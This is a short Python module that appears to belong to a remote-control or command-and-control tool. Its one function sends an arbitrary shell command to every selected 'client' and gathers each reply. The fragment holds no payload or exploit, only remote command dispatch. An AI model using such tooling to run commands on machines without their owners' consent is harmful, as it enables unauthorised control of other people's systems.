import config as config


def shell(command):
    """
    Pops a shell and send commands to the selected clients
    :param command: CMD command to operate
    """
    config.log('Executing shell command on the selected clients...')
    output = ''
    for target in config.targets:
        output = output + '\nClient #' + str(target + 1) + ':\n'
        response = config.send_to_client(target, ('shell ' + command))
        output = output + response
    return output
